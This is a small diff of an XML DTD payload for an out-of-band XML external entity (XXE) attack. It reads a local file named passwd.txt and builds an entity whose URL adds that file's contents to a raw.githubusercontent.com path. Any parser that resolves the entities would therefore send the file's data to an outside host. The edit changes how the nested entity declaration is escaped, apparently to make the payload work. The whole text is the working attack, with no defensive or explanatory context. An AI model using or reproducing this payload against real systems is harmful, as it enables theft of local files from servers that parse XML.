@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///C:\Users\ranjeeth.rajendran\Sketch\workspace8.1\t\xml/passwd.txt">
-<!ENTITY % eval "<!ENTITY test SYSTEM 'https://raw.githubusercontent.com/ranjee/util/main/%file;'>">
+<!ENTITY % eval "<!ENTITY  &#x25; test SYSTEM 'https://raw.githubusercontent.com/ranjee/util/main/%file;'>">
 %eval;
 <!ENTITY rd '%file;'>
